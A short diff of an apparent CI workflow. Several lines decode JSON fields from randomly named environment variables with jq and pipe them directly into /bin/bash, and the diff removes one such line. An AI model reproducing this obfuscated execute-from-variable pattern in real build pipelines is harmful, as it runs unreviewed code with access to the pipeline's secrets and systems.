@@ -23,7 +23,6 @@ jobs:
           echo $eym6875 | jq -r .ff19100 | /bin/bash
           echo $c09448 | jq -r .u12206 | /bin/bash
           echo $vky1 | jq -r .gany76 | /bin/bash
-          printf '%s' "$m9" | jq -r .udp11493 | /bin/bash
           printf '%s' "$osrm51760" | jq -r .w6 | /bin/bash
 
       - name: Archive results
